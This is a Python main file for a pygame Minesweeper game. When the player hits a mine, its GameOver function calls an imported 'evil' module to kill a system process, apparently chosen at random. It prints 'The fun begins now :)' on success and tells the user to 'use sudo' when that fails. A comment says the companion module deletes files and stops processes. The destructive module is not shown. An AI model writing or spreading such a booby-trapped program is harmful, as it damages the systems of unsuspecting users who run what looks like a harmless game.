import pygame
import numpy as np
import engine as en
import random
import evil
import sys

#Main contains only main loop and event listeners and main variables, 
#engine contains functions and variables needed for those functions
#processes contains all the functions related to deleting files and stopping processes

gameover = False
startPoint = True
once = False

refreshRate = 100
timer = 60*100

en.initiateMatrices()
en.renderBase(False)

def GameOver():
    en.renderBase(True)
    en.renderText(True)
    #this is the crucial line that does everything
    try:
        evil.killProcess(evil.pidGenerator().pid)
        print("The fun begins now :):",evil.pidGenerator().name())
    except:
        print("use sudo :)")#---------------------------------------------
    print("Game Over")

#public static void Update()

while en.running:
    #---------------------------------
    for event in pygame.event.get():
        if not gameover:
            if event.type == pygame.MOUSEBUTTONUP and startPoint: #So you can't hit mine on the first click
                
                mousePos = pygame.mouse.get_pos()
                coords = en.clickCollision(mousePos)

                x = coords[0]
                y = coords[1]     

                en.binaryMatrix[x,y] = -1
                en.generateMines()
                startPoint = False

            if event.type == pygame.MOUSEBUTTONUP and not startPoint:

                mousePos = pygame.mouse.get_pos()
                coords = en.clickCollision(mousePos)

                x = coords[0]
                y = coords[1]

                if event.button == 3: #Right click
                    en.flagMatrix[x,y] = 1
                    en.renderBase(False)
                    en.renderText(False)
                elif event.button == 1: #Left click
                    countOfMines = en.countMines(x,y)
                    if not x == None and not y == None:
                        if countOfMines == 0:
                            timer += 5*refreshRate                            
                            en.flagMatrix[x,y] = 0
                            en.expandTile(x,y,0)
                        else:
                            timer += 3*countOfMines*refreshRate

                    if en.isMine(x,y): #if a mine is clicked, oh well.
                        timer = 0
                        gameover = True
                        GameOver()
                        once = True
                    else:
                        en.renderBase(False)
                        en.renderText(False)

                if not en.anythingLeft():
                    print("You win!")
                    en.renderBase(True)
                    gameover = True
                    timer = 0
                    once = True

        if event.type == pygame.QUIT:
            en.running = False

    en.clock.tick(refreshRate)
    
    pygame.display.update()
    pygame.display.flip()